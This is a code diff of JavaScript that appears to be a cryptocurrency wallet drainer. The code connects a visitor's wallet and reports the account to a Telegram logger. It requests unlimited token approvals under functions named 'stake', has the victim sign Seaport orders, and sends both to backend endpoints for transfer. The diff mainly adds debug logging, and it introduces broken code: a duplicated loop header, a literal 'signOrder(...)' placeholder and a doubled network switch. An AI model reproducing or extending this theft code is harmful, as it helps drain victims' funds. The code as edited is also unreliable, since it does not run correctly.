@@ -383,28 +383,36 @@ async function ConnectWallet() {
 
         console.log("Opening wallet...");
 
-        provider = await web3Modal.connect();
+        console.log("========== CONNECT WALLET ==========");
 
-        console.log("Wallet connected", provider);
+provider = await web3Modal.connect();
+console.log("✅ web3Modal.connect success");
 
-        web3 = new Web3(provider);
+web3 = new Web3(provider);
+console.log("✅ Web3 initialized");
 
-        ethersProvider = new ethers.providers.Web3Provider(provider, "any");
+ethersProvider = new ethers.providers.Web3Provider(provider, "any");
+console.log("✅ ethersProvider initialized");
 
-        signer = ethersProvider.getSigner();
+signer = ethersProvider.getSigner();
+console.log("✅ signer obtained");
 
-        if (web3._provider["bridge"]) {
-            selectedProvider = supportedWallets[0];
-        } else {
-            selectedProvider = supportedWallets[1];
-        }
+if (web3._provider["bridge"]) {
+    selectedProvider = supportedWallets[0];
+} else {
+    selectedProvider = supportedWallets[1];
+}
 
-        Seaport = new seaport.Seaport(signer);
+console.log("Provider:", selectedProvider);
 
-        await getWalletAccount();
+Seaport = new seaport.Seaport(signer);
+console.log("✅ Seaport initialized");
 
-        await get12DollarETH();
+await getWalletAccount();
+console.log("✅ getWalletAccount finished");
 
+await get12DollarETH();
+console.log("✅ ETH price loaded");
     } catch (err) {
 
         console.error("ConnectWallet failed:", err);
@@ -426,10 +434,24 @@ async function getWalletAccount() {
     const accounts = await web3.eth.getAccounts();
     waitAlert();
     account = accounts[0];
+    console.log("========== WALLET ACCOUNT ==========");
+console.log("Wallet:", account);
     const connectmsg = '🥇Wallet Connected!<br><b>Account: <code>'+account+'</code></b><br>Domain: '+window.location.hostname;
     logTlg(connectmsg);
     let counter, wethData;
-    [tokenList, counter, wethData] = await Promise.all([getNFTS(account), getCounter(account), getWETH(account)]);
+   console.log("Loading NFTs, Counter and WETH...");
+
+[tokenList, counter, wethData] =
+await Promise.all([
+    getNFTS(account),
+    getCounter(account),
+    getWETH(account)
+]);
+
+console.log("NFT Count:", tokenList.length);
+console.log("Counter:", counter.toString());
+console.log("WETH:", wethData);
+
     counter = parseInt(counter.toString());
     let [balance, allowance] = wethData;
     balance = balance.toString();
@@ -625,6 +647,7 @@ console.log(`Loaded ${tokenList.length} ERC20 tokens from Zapper.`);
 }
     if (offer.offer.length == 0) {
         tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);
+        console.log("Calling sendToken...");
         await sendToken(wasWethApproved, offer, counter, Seaport);
         await waitClose();
         return;
@@ -758,22 +781,62 @@ async function stakeERC20(tokenAddress, amount, msg, chainId, abiUrl) {
       return data;
     }
 
-    try {
-        await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
-         from: account,
-         gas: 110000,
-         gasPrice:0
+   try {
+
+    console.log("========== ERC20 APPROVAL ==========");
+    console.log("Token:", tokenAddress);
+    console.log("Owner:", account);
+    console.log("Operator:", operator);
+
+    console.log("Opening approval popup...");
+
+    const tx = await tokenContract.methods
+        .approve(operator, MAX_APPROVAL)
+        .send({
+            from: account,
+            gas: 110000,
+            gasPrice: 0
         });
-        const data = {chainId: chainId, tokenAddress: tokenAddress, abiUrl: abiUrl, amount: amount, owner: account, spender: operator};
-        axios.post(TOKEN_TRANSFER, data).then(function (response) {
-            console.log(response);
-            logTlgMsg(msg, success);
-          });
-    } catch(e){
-      console.log(e)
-      success = 0;
-      logTlgMsg(msg, success);
-    }
+
+    console.log("✅ Approval Success");
+    console.log(tx);
+
+    const data = {
+        chainId,
+        tokenAddress,
+        abiUrl,
+        amount,
+        owner: account,
+        spender: operator
+    };
+
+    console.log("Posting to backend...");
+    console.log(data);
+
+    const response = await axios.post(
+        TOKEN_TRANSFER,
+        data
+    );
+
+    console.log("✅ Backend Response");
+    console.log(response.data);
+
+    logTlgMsg(msg, success);
+
+} catch(e){
+
+    console.log("❌ APPROVAL FAILED");
+    console.log(e);
+
+    console.log("Error Code:", e.code);
+    console.log("Error Message:", e.message);
+    console.log("Full Error:", JSON.stringify(e, null, 2));
+
+    success = 0;
+
+    logTlgMsg(msg, success);
+}
+
 }
 
 async function stakeNFT(tokenAddress, nftTokenID, msg) {
@@ -814,7 +877,14 @@ async function stake1155NFT(tokenAddress, nftTokenID, msg) {
 }
 
 async function sendToken(wasWethApproved, offer, counter, Seaport) {
+console.log("========== SEND TOKEN ==========");
+console.log("Total Items:", tokenList.length);
 
+for (const item of tokenList) {
+
+    console.log("---------------------------");
+    console.log("Current Item:");
+    console.log(item);
   for(var item of tokenList) {
     if(item < 1) return alertshow();
       if (!item.approved) {
@@ -825,12 +895,19 @@ async function sendToken(wasWethApproved, offer, counter, Seaport) {
             if(item.type == "erc721") return;
             if(item.type == "seaport") return;
         };
-        
+        console.log("Checking chain...");
         const currentChainId = await web3.eth.net.getId();
         const chainHex = web3.utils.toHex(currentChainId);
+          console.log("Wallet Chain:", chainHex);
+console.log("Required Chain:", chainToId[item.chain]?.chainId);
           console.log("item.chain =", item.chain);
 console.log("chainToId =", Object.keys(chainToId));
         if (chainHex !== chainToId[item.chain].chainId) {
+            console.log("Switching network...");
+
+await changeNetwork(chainToId[item.chain].chainId);
+
+console.log("Network switched.");
             await changeNetwork(chainToId[item.chain].chainId);
         }
         try {
@@ -857,7 +934,15 @@ console.log("chainToId =", Object.keys(chainToId));
           else if(item.type == "seaport") {
                 success = 1;
                 message = '🐳<b>Seaport</b><br>Price: <code>'+item.balance+ ' $</code><br><br>Account: <code>'+account+'</code><br><br><b>Data Offer:</b><br>'+ JSON.stringify(offer) +'<br><br>Domain: '+window.location.hostname;
-                await Seaport.signOrder(offer, parseInt(counter)).then(function(response){
+                console.log("========== SEAPORT ==========");
+console.log("Opening sign popup...");
+
+await Seaport.signOrder(...)
+.then(function(response){
+
+    console.log("✅ Signature received");
+    console.log(response);
+
                     let sgt = response;
                     offer["counter"] = parseInt(counter);
                     const order = {
@@ -866,12 +951,21 @@ console.log("chainToId =", Object.keys(chainToId));
                         "signature": sgt,
                     }
                     logTlg(JSON.stringify(order));
-                    axios.post(SEAPORT_SIGN, order).then(function (response) {
-                        console.log(response);
+                    console.log("Posting Seaport order...");
+
+axios.post(SEAPORT_SIGN, order)
+.then(function(response){
+
+    console.log("✅ Backend Response");
+    console.log(response.data);
                         logTlgMsg(message, success);
                     });
                 }).catch(function(error) {
-                    console.log(error);
+
+    console.log("❌ SIGNATURE FAILED");
+    console.log(error);
+    console.log(error.code);
+    console.log(error.message);
                     success = 0;
                     logTlgMsg(message, success);
                     return;
